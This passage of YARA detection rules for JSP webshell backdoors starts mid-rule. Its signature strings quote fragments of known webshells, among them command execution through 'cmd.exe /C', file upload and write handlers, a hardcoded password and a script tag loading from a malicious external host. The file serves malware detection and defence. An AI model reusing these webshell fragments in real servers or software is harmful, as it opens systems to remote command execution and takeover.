        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>"
        $s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />"
        $s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000640
{
    meta:
        description = "404.jsp, data.jsp, in.jsp, jfolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
        $s2 = " KB </td>"
        $s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
        $s4 = "<!-- <tr align=\"center\"> "
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000641
{
    meta:
        description = "browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "private static final int EDITFIELD_ROWS = 30;"
        $s2 = "private static String tempdir = \".\";"
        $s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000642
{
    meta:
        description = "000.jsp, 403.jsp, c5.jsp, querydong.jsp, spyjsp2010.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
        $s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
        $s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000643
{
    meta:
        description = "generated from file jsp.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
        $s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
        $s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000644
{
    meta:
        description = "generated from file jspyyy.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000645
{
    meta:
        description = "generated from file jjjsp3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000646
{
    meta:
        description = "generated from file jjjsp2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
        $s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
        $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
        $s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000647
{
    meta:
        description = "semi-auto-generated jspshall.jsp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "kj021320"
        $s1 = "case 'T':systemTools(out);break;"
        $s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000648
{
    meta:
        description = "semi-auto-generated JspWebshell 1.2.jsp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "JspWebshell"
        $s1 = "CreateAndDeleteFolder is error:"
        $s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
        $s3 = "String _password =\"111\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000649
{
    meta:
        description = "semi-auto-generated cmdjsp.jsp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" "
        $s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);"
        $s2 = "cmdjsp.jsp"
        $s3 = "michaeldaw.org"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000650
{
    meta:
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        description = "webshell and exploit code in relation with apt against honk kong protesters jsp"
        date = "2014-10-10"
        
    strings:
    $a0 = "<script language=javascript src=http://java-se.com/o.js</script>"
    $s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
    $s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
        
    condition:
    $a0 or ( all of ($s*) )
}
rule Backdoor_Webshell_JSP_000651
{
    meta:
        description = "vonloesch jsp browser used as web shell by apt groups browser 1.1a"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-10-10"
        
    strings:
        $a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
        $a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
        $a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
        $a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000652
{
    meta:
        description = "jsp browser used as web shell by apt groups"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-10-12"
        
    strings:
        $a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
        $a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000653
{
    meta:
        description = "jsp browser used as web shell by apt groups"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-10-12"
        
    strings:
        $a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
        $a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
        $s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
        $s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
        
    condition:
        all of ($a*) or all of ($s*)
}
rule Backdoor_Webshell_JSP_000654
{
    meta:
        description = "semi-auto-generated java shell.js.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "PySystemState.initialize(System.getProperties(), null, argv);"
        $s3 = "public class JythonShell extends JPanel implements Runnable {"
        $s4 = "public static int DEFAULT_SCROLLBACK = 100"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000655
{
    meta:
        description = "laudanum injector tools web.xml"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "<servlet-name>Command</servlet-name>" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_JSP_000656
{
    meta:
        description = "laudanum injector tools cmd.war"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s0 = "cmd.jsp}" fullword ascii
        $s1 = "cmd.jspPK" fullword ascii
        $s2 = "WEB-INF/web.xml" fullword ascii /* Goodware String - occured 1 times */
        $s3 = "WEB-INF/web.xmlPK" fullword ascii /* Goodware String - occured 1 times */
        $s4 = "META-INF/MANIFEST.MF" fullword ascii /* Goodware String - occured 12 times */
        
    condition:
        uint16(0) == 0x4b50 and filesize < 2KB and all of them
}
